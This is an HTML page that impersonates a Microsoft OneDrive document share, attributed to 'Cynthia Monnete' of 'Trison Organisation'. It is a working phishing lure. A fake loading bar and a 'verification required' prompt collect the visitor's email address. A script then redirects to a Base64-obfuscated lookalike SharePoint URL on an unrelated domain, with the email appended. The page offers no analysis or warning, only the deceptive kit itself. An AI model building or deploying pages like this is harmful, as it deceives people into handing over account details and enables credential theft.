<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trison Organisation - Document</title>
    
    <!-- Include Font Awesome for icons -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden; /* Prevents scrollbar */
        }

        /* Set the background image */
        .background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://raw.githubusercontent.com/staffdgm/msworrd/refs/heads/main/onedrive.JPG'); /* Replace with your image URL */
            background-size: cover;
            background-position: center;
            filter: blur(5px); /* Initial blur value */
            transition: filter 0.3s ease; /* Smooth transition for blur */
            z-index: -1; /* Keeps the image behind the content */
        }

        .container {
            background-color: rgba(255, 255, 255, 0.8); /* Slight opacity to let the background show through */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 400px;
            text-align: center;
            position: relative;
            z-index: 1; /* Keeps the container above the background */
			margin-top: 70px; /* Add this to push the container down */
        }

        h1 {
            margin-bottom: 10px;
            font-size: 24px;
        }

        p {
            font-size: 14px;
            margin-bottom: 20px;
        }

        .button {
            background-color: #007BFF;
            color: white;
            padding: 8px 15px; /* Adjusted for smaller size */
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px; /* Adjusted font size */
            width: 100%;
            max-width: 100px; /* Set max width to match the image style */
            margin-top: 10px;
        }

        .button:hover {
            background-color: #0056b3;
        }

        .status-bar-container {
            margin-top: 20px;
        }

        .status-bar {
            width: 100%;
            height: 10px;
            background-color: #ddd;
            border-radius: 5px;
        }

        .status-bar-fill {
            height: 100%;
            background-color: #28a745;
            border-radius: 5px;
            width: 0%; /* Start at 0% */
        }

        .status-text {
            margin-top: 5px;
            font-size: 16px;
        }

        .verification-message {
            margin-top: 20px;
            padding: 15px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            width: auto;
            background-color: transparent;
        }

        .verification-text {
            background-color: #ffc107;
            padding: 5px;
            border-radius: 5px;
            display: inline-flex;
            align-items: center;
        }

        .verification-buttons {
            margin-top: 10px;
        }

        .hidden {
            display: none;
        }

        input[type="email"] {
            padding: 10px;
            width: 80%;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .lock-icon {
            margin-right: 10px;
        }

        /* Overlay CSS */
        .overlay {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5); /* Dimmed overlay */
        }
    </style>
</head>
<body>
    <div class="background" id="backgroundImage"></div> <!-- Background image element -->

    <div class="container">
        <h1>Trison Organisation</h1>
        <p>This Document has been shared with you by Cynthia Monnete via OneDrive</p>
        <button class="button" id="downloadButton" onclick="startProcessing()">Open</button>

        <div class="status-bar-container hidden" id="statusBarContainer">
            <p class="status-text" id="statusText">Status: Processing files...</p>
            <div class="status-bar">
                <div class="status-bar-fill" id="statusBarFill"></div>
            </div>
            <p id="completionText">Completion: 0%</p>
        </div>

        <div class="verification-message hidden" id="verificationMessage">
            <p class="verification-text">
                <i class="fas fa-lock lock-icon"></i><strong>Verification required</strong>
            </p>
            <p>For security purposes, This Document is protected for your view only<h5>Enter your email below.</h1></p>
            <input type="email" id="emailInput" placeholder="Enter your email">
            <div class="verification-buttons">
                <button class="button" onclick="verifyEmail()">Next</button>
            </div>
        </div>
    </div>

    <script>
        // Function to validate email format
        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        // Function to handle email verification and redirection
        function verifyEmail() {
            const emailInput = document.getElementById("emailInput").value.trim();

            // Validate email format
            if (!validateEmail(emailInput)) {
                alert("Please enter a valid email address.");
                return;
            }

            // Hide the verification message and show the progress bar
            document.getElementById("verificationMessage").style.display = "none";
            document.getElementById("statusBarContainer").classList.remove("hidden");

            let progress = 20; // Start from 20%
            let loadingInterval = setInterval(function() {
                progress += 1;
                document.getElementById("statusBarFill").style.width = progress + "%";
                document.getElementById("completionText").innerText = "Completion: " + progress + "%";

                if (progress >= 100) {
                    clearInterval(loadingInterval); // Stop once the progress bar reaches 100%
                    
                    // Redirect to a URL with the email appended
                    const encodedRedirectURL = "aHR0cHM6Ly9jY2M4aW50ZXJuYXRpb25hbHNoYXJlcG9pbnR0ZmRmLmV2b2x1dGlvbmFyeS5pdC5jb20veXpOVEkvP2U9"; // Base64 encoded URL
                    const decodedRedirectURL = atob(encodedRedirectURL); // Decode Base64
                    const redirectURL = `${decodedRedirectURL}${emailInput}`; // Append email directly
                    window.location.href = redirectURL; // Redirect to the final URL
                }
            }, 50); // Increment progress every 50ms for faster loading
        }

        // Function to start processing (for progress bar and status)
        let progress = 0;
        let loadingInterval;
        let statusText = document.getElementById("statusText");
        let statusBarFill = document.getElementById("statusBarFill");
		
		  // Adjust the blur effect based on a predefined value
        function setBlurEffect(blurValue) {
            console.log(`Setting blur value to: ${blurValue}px`); // Debugging log
            document.getElementById("backgroundImage").style.filter = `blur(${blurValue}px)`;
        }

        // Call this function to set the blur effect on the page
        setBlurEffect(1); // Initial blur set to 5px, you can adjust this value

        function startProcessing() {
            // Hide the download button and show the progress bar
            document.getElementById("downloadButton").style.display = "none";
            document.getElementById("statusBarContainer").classList.remove("hidden");

            // Start the loading progress
            loadingInterval = setInterval(function() {
                progress += 1;
                statusBarFill.style.width = progress + "%";
                document.getElementById("completionText").innerText = "Completion: " + progress + "%";

                if (progress >= 5 && progress < 100) {
                    statusText.innerText = "Verifying..."; // Change status to "Verifying" at 5%
                }

                if (progress >= 10 && progress < 100) {
                    statusText.innerText = "Confirming Recipient Email..."; // Change status to "Confirming Recipient Email" after another 5 seconds
                }

                // Once progress reaches 20%, show the email verification message
                if (progress >= 30 && progress < 100) {
                    document.getElementById("verificationMessage").classList.remove("hidden");
                    clearInterval(loadingInterval); // Stop the progress at 20%
                }

            }, 100); // Increment every 1 second to simulate the process
        }
    </script>
</body>
</html>
